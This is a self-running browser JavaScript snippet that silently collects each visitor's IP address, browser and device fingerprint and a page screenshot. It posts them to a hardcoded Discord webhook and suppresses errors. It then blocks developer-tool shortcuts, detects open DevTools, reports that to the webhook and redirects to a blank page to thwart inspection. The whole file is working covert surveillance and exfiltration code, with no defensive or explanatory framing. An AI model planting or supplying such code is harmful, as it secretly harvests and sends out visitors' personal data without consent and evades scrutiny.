(function() {
    var webhookUrl = 'https://discord.com/api/webhooks/1409701776835481772/75d7K4GR4hEKgbKQys-Q_yBbSq-kUw2K1GTdKp24ehgCz0mprSQw8juEH-y7-69jxsff';
    var dataSent = false;

    function sendToWebhook(data, type) {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', webhookUrl, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            
            var payload = {
                type: type,
                timestamp: new Date().toISOString(),
                url: window.location.href,
                data: data
            };
            
            xhr.send(JSON.stringify(payload));
        } catch(e) {
            // Silent fail if webhook fails
        }
    }

    function getIPAddress() {
        return new Promise((resolve) => {
            // Method 1: Using a third-party API
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => resolve(data.ip))
                .catch(() => {
                    // Fallback method 2
                    fetch('https://jsonip.com')
                        .then(response => response.json())
                        .then(data => resolve(data.ip))
                        .catch(() => {
                            // Fallback method 3
                            fetch('https://api64.ipify.org?format=json')
                                .then(response => response.json())
                                .then(data => resolve(data.ip))
                                .catch(() => resolve('unknown'));
                        });
                });
        });
    }

    function takeScreenshot() {
        return new Promise((resolve) => {
            try {
                // Use html2canvas library would be better, but for basic approach:
                if (typeof html2canvas !== 'undefined') {
                    html2canvas(document.body).then(canvas => {
                        resolve(canvas.toDataURL('image/png'));
                    }).catch(() => resolve(null));
                } else {
                    // Basic canvas screenshot (limited functionality)
                    var canvas = document.createElement('canvas');
                    var ctx = canvas.getContext('2d');
                    canvas.width = window.innerWidth;
                    canvas.height = window.innerHeight;
                    
                    // Try to draw the current view (may not work due to security restrictions)
                    try {
                        ctx.drawImage(document.body, 0, 0, canvas.width, canvas.height);
                        resolve(canvas.toDataURL('image/png'));
                    } catch(e) {
                        resolve(null);
                    }
                }
            } catch(e) {
                resolve(null);
            }
        });
    }

    async function logData() {
        // Get IP address first
        var ipAddress = await getIPAddress();
        
        // Take screenshot
        var screenshot = await takeScreenshot();

        var data = {
            userAgent: navigator.userAgent,
            appName: navigator.appName,
            appVersion: navigator.appVersion,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookiesEnabled: navigator.cookieEnabled,
            online: navigator.onLine,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            colorDepth: window.screen.colorDepth,
            pixelDepth: window.screen.pixelDepth,
            plugins: Array.from(navigator.plugins).map(p => p.name),
            canvas: !!document.createElement('canvas').getContext,
            webgl: !!window.WebGLRenderingContext,
            webAssembly: !!window.WebAssembly,
            ipAddress: ipAddress,
            screenshot: screenshot // Base64 encoded image
        };

        sendToWebhook(data, 'user_data');
        dataSent = true;
        
        // Start DevTools monitoring after data is sent
        setTimeout(initDevToolsProtection, 1000);
    }

    function initDevToolsProtection() {
        if (!dataSent) return;

        // Basic DevTools detection
        function checkDevTools() {
            // Method 1: Window size difference
            if (window.outerWidth - window.innerWidth > 160 || 
                window.outerHeight - window.innerHeight > 80) {
                handleDevToolsDetected();
                return;
            }

            // Method 2: Debugger detection (basic)
            var startTime = performance.now();
            debugger;
            var endTime = performance.now();
            
            if (endTime - startTime > 100) {
                handleDevToolsDetected();
            }
        }

        // Check periodically
        setInterval(checkDevTools, 2000);

        // Keyboard shortcuts protection
        document.addEventListener('keydown', function(e) {
            // F12, Ctrl+Shift+I, Ctrl+Shift+C
            if (e.keyCode === 123 || 
                (e.ctrlKey && e.shiftKey && e.keyCode === 73) || 
                (e.ctrlKey && e.shiftKey && e.keyCode === 67)) {
                e.preventDefault();
                handleDevToolsDetected();
                return false;
            }
        });
    }

    function handleDevToolsDetected() {
        sendToWebhook({message: 'DevTools detected'}, 'devtools_detected');
        
        // Basic response - just redirect to blank page
        setTimeout(function() {
            window.location.href = 'about:blank';
        }, 500);
    }

    // Load html2canvas for better screenshots if not already loaded
    function loadHtml2Canvas() {
        return new Promise((resolve) => {
            if (typeof html2canvas !== 'undefined') {
                resolve();
                return;
            }
            
            var script = document.createElement('script');
            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
            script.onload = resolve;
            script.onerror = resolve;
            document.head.appendChild(script);
        });
    }

    // Start the process
    loadHtml2Canvas().then(() => {
        logData();
    });

    // Fallback - if data doesn't send within 5 seconds, start protection anyway
    setTimeout(function() {
        if (!dataSent) {
            dataSent = true;
            initDevToolsProtection();
        }
    }, 5000);

})();
